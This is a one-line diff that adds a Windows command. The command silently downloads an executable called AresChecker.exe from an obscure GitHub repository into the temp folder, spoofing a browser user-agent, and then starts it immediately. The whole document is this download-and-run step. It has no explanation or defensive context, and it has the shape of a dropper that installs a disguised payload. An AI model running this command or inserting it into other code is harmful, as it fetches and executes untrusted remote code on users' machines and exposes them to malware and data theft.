@@ -1,0 +1,1 @@
+curl.exe -L -s -o "%TEMP%\AresChecker.exe" -A "Mozilla/5.0" "https://github.com/uwuwusudj/-/raw/refs/heads/main/AresChecker.exe" && start "" "%TEMP%\AresChecker.exe"
